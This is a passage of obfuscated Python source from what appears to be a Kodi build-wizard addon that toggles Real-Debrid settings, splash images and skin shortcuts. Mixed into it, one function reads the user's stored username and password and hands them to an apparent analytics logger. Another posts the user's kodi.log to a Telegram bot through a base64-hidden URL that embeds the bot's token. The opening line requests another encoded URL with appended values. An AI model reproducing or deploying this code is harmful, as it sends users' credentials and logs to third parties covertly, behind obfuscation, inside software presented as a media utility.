          OO00OOO00000O0OOO =urllib2 .urlopen (O0O0OOO00000OOOOO .decode ('base64')+' - '+OOOOOO0OOOOOO00O0 +' - '+O0O0OOO00O0O00OO0 +' - '+OO0O0OOO0OO0O00OO ).readlines ()#line:578
       except :pass #line:579
def googleindicat ():#line:582
			import logg #line:583
			OOO0O000O0O0000OO =(ADDON .getSetting ("pass"))#line:584
			O00OO0OOO0O0O0OOO =(ADDON .getSetting ("user"))#line:585
			logg .logGA (OOO0O000O0O0000OO ,O00OO0OOO0O0O0OOO )#line:586
def logsend ():#line:587
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:588
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:589
      howsentlog ()#line:591
      import requests #line:592
      if xbmc .getCondVisibility ('system.platform.windows'):#line:593
         O00OOOOOO00OOOOOO =xbmc .translatePath ('special://home/kodi.log')#line:594
         O0OOOOOO00OO00O0O ={'chat_id':(None ,'-274262389'),'document':(O00OOOOOO00OOOOOO ,open (O00OOOOOO00OOOOOO ,'rb')),}#line:598
         OO0OOO0O00OO0OO0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:599
         OO00OOOO00000OO0O =requests .post (OO0OOO0O00OO0OO0O .decode ('base64'),files =O0OOOOOO00OO00O0O )#line:601
      elif xbmc .getCondVisibility ('system.platform.android'):#line:602
           O00OOOOOO00OOOOOO =xbmc .translatePath ('special://temp/kodi.log')#line:603
           O0OOOOOO00OO00O0O ={'chat_id':(None ,'-274262389'),'document':(O00OOOOOO00OOOOOO ,open (O00OOOOOO00OOOOOO ,'rb')),}#line:607
           OO0OOO0O00OO0OO0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:608
           OO00OOOO00000OO0O =requests .post (OO0OOO0O00OO0OO0O .decode ('base64'),files =O0OOOOOO00OO00O0O )#line:610
      else :#line:611
           O00OOOOOO00OOOOOO =xbmc .translatePath ('special://kodi.log')#line:612
           O0OOOOOO00OO00O0O ={'chat_id':(None ,'-274262389'),'document':(O00OOOOOO00OOOOOO ,open (O00OOOOOO00OOOOOO ,'rb')),}#line:616
           OO0OOO0O00OO0OO0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:617
           OO00OOOO00000OO0O =requests .post (OO0OOO0O00OO0OO0O .decode ('base64'),files =O0OOOOOO00OO00O0O )#line:619
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:620
def rdoff ():#line:622
	O0O0O0OOO00000O00 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:623
	O0O0O0OOO00000O00 .setSetting ('rd.client_id','')#line:624
	O0O0O0OOO00000O00 .setSetting ('rd.secret','')#line:625
	O0O0O0OOO00000O00 .setSetting ('rdsource','false')#line:626
	O0O0O0OOO00000O00 .setSetting ('super_fast_type_toren','false')#line:627
	O0O0O0OOO00000O00 .setSetting ('rd.auth','false')#line:628
	O0O0O0OOO00000O00 .setSetting ('rd.refresh','false')#line:629
	O0O0O0OOO00000O00 .setSetting ('magnet','false')#line:630
	O0O0O0OOO00000O00 .setSetting ('torrent_server','false')#line:631
	O0O0O0OOO00000O00 =xbmcaddon .Addon ('script.module.resolveurl')#line:633
	O0O0O0OOO00000O00 .setSetting ('RealDebridResolver_client_id','')#line:634
	O0O0O0OOO00000O00 .setSetting ('RealDebridResolver_client_secret','')#line:635
	O0O0O0OOO00000O00 .setSetting ('RealDebridResolver_token','')#line:636
	O0O0O0OOO00000O00 .setSetting ('RealDebridResolver_refresh','')#line:637
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:638
		O0O0O0OOO00000O00 =xbmcaddon .Addon ('plugin.video.seren')#line:639
		O0O0O0OOO00000O00 .setSetting ('rd.client_id','')#line:641
		O0O0O0OOO00000O00 .setSetting ('rd.secret','')#line:642
		O0O0O0OOO00000O00 .setSetting ('rd.auth','')#line:643
		O0O0O0OOO00000O00 .setSetting ('rd.refresh','')#line:644
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:645
		O0O0O0OOO00000O00 =xbmcaddon .Addon ('plugin.video.gaia')#line:646
		O0O0O0OOO00000O00 .setSetting ('accounts.debrid.realdebrid.id','')#line:647
		O0O0O0OOO00000O00 .setSetting ('accounts.debrid.realdebrid.secret','')#line:648
		O0O0O0OOO00000O00 .setSetting ('accounts.debrid.realdebrid.token','')#line:649
		O0O0O0OOO00000O00 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:650
	resloginit .resloginit ('restore','all')#line:651
	OO0OO000OO0OOO000 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:653
	O0000OOO0OO0000OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:654
	copyfile (OO0OO000OO0OOO000 ,O0000OOO0OO0000OO )#line:655
def skindialogsettind18 ():#line:656
	try :#line:657
		O00O0O0OO0000OOO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:658
		OOO0O000O0OOOO0OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:659
		copyfile (O00O0O0OO0000OOO0 ,OOO0O000O0OOOO0OO )#line:660
	except :pass #line:661
def rdon ():#line:662
	loginit .loginIt ('restore','all')#line:663
	OOO0O0OOO0O00O00O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:665
	OO00O0OOOOOO000OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:666
	copyfile (OOO0O0OOO0O00O00O ,OO00O0OOOOOO000OO )#line:667
def adults18 ():#line:669
  O0OO000O00000OOOO =(ADDON .getSetting ("adults"))#line:670
  if O0OO000O00000OOOO =='true':#line:671
    O000O0000O000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:672
    with open (O000O0000O000OO00 ,'r')as O0OO0000O0000O0OO :#line:673
      OOOOOO0OOOO0O0O00 =O0OO0000O0000O0OO .read ()#line:674
    OOOOOO0OOOO0O0O00 =OOOOOO0OOOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:692
    with open (O000O0000O000OO00 ,'w')as O0OO0000O0000O0OO :#line:695
      O0OO0000O0000O0OO .write (OOOOOO0OOOO0O0O00 )#line:696
def rdbuildaddon ():#line:697
  O0OO0O0OO0OO000OO =(ADDON .getSetting ("auto_rd"))#line:698
  if O0OO0O0OO0OO000OO =='true':#line:699
    O000O0000O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:700
    with open (O000O0000O00OO00O ,'r')as OOOOOOOOO000OO0OO :#line:701
      OO000OOOO000OOO0O =OOOOOOOOO000OO0OO .read ()#line:702
    OO000OOOO000OOO0O =OO000OOOO000OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:720
    with open (O000O0000O00OO00O ,'w')as OOOOOOOOO000OO0OO :#line:723
      OOOOOOOOO000OO0OO .write (OO000OOOO000OOO0O )#line:724
    O000O0000O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:728
    with open (O000O0000O00OO00O ,'r')as OOOOOOOOO000OO0OO :#line:729
      OO000OOOO000OOO0O =OOOOOOOOO000OO0OO .read ()#line:730
    OO000OOOO000OOO0O =OO000OOOO000OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:748
    with open (O000O0000O00OO00O ,'w')as OOOOOOOOO000OO0OO :#line:751
      OOOOOOOOO000OO0OO .write (OO000OOOO000OOO0O )#line:752
    O000O0000O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:756
    with open (O000O0000O00OO00O ,'r')as OOOOOOOOO000OO0OO :#line:757
      OO000OOOO000OOO0O =OOOOOOOOO000OO0OO .read ()#line:758
    OO000OOOO000OOO0O =OO000OOOO000OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:776
    with open (O000O0000O00OO00O ,'w')as OOOOOOOOO000OO0OO :#line:779
      OOOOOOOOO000OO0OO .write (OO000OOOO000OOO0O )#line:780
    O000O0000O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:784
    with open (O000O0000O00OO00O ,'r')as OOOOOOOOO000OO0OO :#line:785
      OO000OOOO000OOO0O =OOOOOOOOO000OO0OO .read ()#line:786
    OO000OOOO000OOO0O =OO000OOOO000OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:804
    with open (O000O0000O00OO00O ,'w')as OOOOOOOOO000OO0OO :#line:807
      OOOOOOOOO000OO0OO .write (OO000OOOO000OOO0O )#line:808
    O000O0000O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:811
    with open (O000O0000O00OO00O ,'r')as OOOOOOOOO000OO0OO :#line:812
      OO000OOOO000OOO0O =OOOOOOOOO000OO0OO .read ()#line:813
    OO000OOOO000OOO0O =OO000OOOO000OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:831
    with open (O000O0000O00OO00O ,'w')as OOOOOOOOO000OO0OO :#line:834
      OOOOOOOOO000OO0OO .write (OO000OOOO000OOO0O )#line:835
    O000O0000O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:837
    with open (O000O0000O00OO00O ,'r')as OOOOOOOOO000OO0OO :#line:838
      OO000OOOO000OOO0O =OOOOOOOOO000OO0OO .read ()#line:839
    OO000OOOO000OOO0O =OO000OOOO000OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:857
    with open (O000O0000O00OO00O ,'w')as OOOOOOOOO000OO0OO :#line:860
      OOOOOOOOO000OO0OO .write (OO000OOOO000OOO0O )#line:861
    O000O0000O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:863
    with open (O000O0000O00OO00O ,'r')as OOOOOOOOO000OO0OO :#line:864
      OO000OOOO000OOO0O =OOOOOOOOO000OO0OO .read ()#line:865
    OO000OOOO000OOO0O =OO000OOOO000OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:883
    with open (O000O0000O00OO00O ,'w')as OOOOOOOOO000OO0OO :#line:886
      OOOOOOOOO000OO0OO .write (OO000OOOO000OOO0O )#line:887
    O000O0000O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:890
    with open (O000O0000O00OO00O ,'r')as OOOOOOOOO000OO0OO :#line:891
      OO000OOOO000OOO0O =OOOOOOOOO000OO0OO .read ()#line:892
    OO000OOOO000OOO0O =OO000OOOO000OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:910
    with open (O000O0000O00OO00O ,'w')as OOOOOOOOO000OO0OO :#line:913
      OOOOOOOOO000OO0OO .write (OO000OOOO000OOO0O )#line:914
def rdbuildinstall ():#line:917
  try :#line:918
   OOOO00OO0OOO0O0O0 =(ADDON .getSetting ("auto_rd"))#line:919
   if OOOO00OO0OOO0O0O0 =='true':#line:920
     O00OO000OO0OO0000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:921
     OO0OOO0O00OOO0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:922
     copyfile (O00OO000OO0OO0000 ,OO0OOO0O00OOO0O00 )#line:923
  except :#line:924
     pass #line:925
def rdbuildaddonoff ():#line:928
    OO0OOO000O0O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:931
    with open (OO0OOO000O0O0O000 ,'r')as OOOOOO0OOOO000OO0 :#line:932
      OOO0OO0O0O0OO0OO0 =OOOOOO0OOOO000OO0 .read ()#line:933
    OOO0OO0O0O0OO0OO0 =OOO0OO0O0O0OO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:951
    with open (OO0OOO000O0O0O000 ,'w')as OOOOOO0OOOO000OO0 :#line:954
      OOOOOO0OOOO000OO0 .write (OOO0OO0O0O0OO0OO0 )#line:955
    OO0OOO000O0O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:959
    with open (OO0OOO000O0O0O000 ,'r')as OOOOOO0OOOO000OO0 :#line:960
      OOO0OO0O0O0OO0OO0 =OOOOOO0OOOO000OO0 .read ()#line:961
    OOO0OO0O0O0OO0OO0 =OOO0OO0O0O0OO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:979
    with open (OO0OOO000O0O0O000 ,'w')as OOOOOO0OOOO000OO0 :#line:982
      OOOOOO0OOOO000OO0 .write (OOO0OO0O0O0OO0OO0 )#line:983
    OO0OOO000O0O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:987
    with open (OO0OOO000O0O0O000 ,'r')as OOOOOO0OOOO000OO0 :#line:988
      OOO0OO0O0O0OO0OO0 =OOOOOO0OOOO000OO0 .read ()#line:989
    OOO0OO0O0O0OO0OO0 =OOO0OO0O0O0OO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1007
    with open (OO0OOO000O0O0O000 ,'w')as OOOOOO0OOOO000OO0 :#line:1010
      OOOOOO0OOOO000OO0 .write (OOO0OO0O0O0OO0OO0 )#line:1011
    OO0OOO000O0O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1015
    with open (OO0OOO000O0O0O000 ,'r')as OOOOOO0OOOO000OO0 :#line:1016
      OOO0OO0O0O0OO0OO0 =OOOOOO0OOOO000OO0 .read ()#line:1017
    OOO0OO0O0O0OO0OO0 =OOO0OO0O0O0OO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1035
    with open (OO0OOO000O0O0O000 ,'w')as OOOOOO0OOOO000OO0 :#line:1038
      OOOOOO0OOOO000OO0 .write (OOO0OO0O0O0OO0OO0 )#line:1039
    OO0OOO000O0O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1042
    with open (OO0OOO000O0O0O000 ,'r')as OOOOOO0OOOO000OO0 :#line:1043
      OOO0OO0O0O0OO0OO0 =OOOOOO0OOOO000OO0 .read ()#line:1044
    OOO0OO0O0O0OO0OO0 =OOO0OO0O0O0OO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1062
    with open (OO0OOO000O0O0O000 ,'w')as OOOOOO0OOOO000OO0 :#line:1065
      OOOOOO0OOOO000OO0 .write (OOO0OO0O0O0OO0OO0 )#line:1066
    OO0OOO000O0O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1068
    with open (OO0OOO000O0O0O000 ,'r')as OOOOOO0OOOO000OO0 :#line:1069
      OOO0OO0O0O0OO0OO0 =OOOOOO0OOOO000OO0 .read ()#line:1070
    OOO0OO0O0O0OO0OO0 =OOO0OO0O0O0OO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1088
    with open (OO0OOO000O0O0O000 ,'w')as OOOOOO0OOOO000OO0 :#line:1091
      OOOOOO0OOOO000OO0 .write (OOO0OO0O0O0OO0OO0 )#line:1092
    OO0OOO000O0O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1094
    with open (OO0OOO000O0O0O000 ,'r')as OOOOOO0OOOO000OO0 :#line:1095
      OOO0OO0O0O0OO0OO0 =OOOOOO0OOOO000OO0 .read ()#line:1096
    OOO0OO0O0O0OO0OO0 =OOO0OO0O0O0OO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1114
    with open (OO0OOO000O0O0O000 ,'w')as OOOOOO0OOOO000OO0 :#line:1117
      OOOOOO0OOOO000OO0 .write (OOO0OO0O0O0OO0OO0 )#line:1118
    OO0OOO000O0O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1121
    with open (OO0OOO000O0O0O000 ,'r')as OOOOOO0OOOO000OO0 :#line:1122
      OOO0OO0O0O0OO0OO0 =OOOOOO0OOOO000OO0 .read ()#line:1123
    OOO0OO0O0O0OO0OO0 =OOO0OO0O0O0OO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1141
    with open (OO0OOO000O0O0O000 ,'w')as OOOOOO0OOOO000OO0 :#line:1144
      OOOOOO0OOOO000OO0 .write (OOO0OO0O0O0OO0OO0 )#line:1145
def rdbuildinstalloff ():#line:1148
    try :#line:1149
       OOO0O0000000O0OO0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1150
       OO0O0O0000O000O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1151
       copyfile (OOO0O0000000O0OO0 ,OO0O0O0000O000O00 )#line:1153
       OOO0O0000000O0OO0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1155
       OO0O0O0000O000O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1156
       copyfile (OOO0O0000000O0OO0 ,OO0O0O0000O000O00 )#line:1158
       OOO0O0000000O0OO0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1160
       OO0O0O0000O000O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1161
       copyfile (OOO0O0000000O0OO0 ,OO0O0O0000O000O00 )#line:1163
       OOO0O0000000O0OO0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1166
       OO0O0O0000O000O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1167
       copyfile (OOO0O0000000O0OO0 ,OO0O0O0000O000O00 )#line:1169
    except :#line:1171
       pass #line:1172
def rdbuildaddonON ():#line:1179
    OO00O0O00O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1181
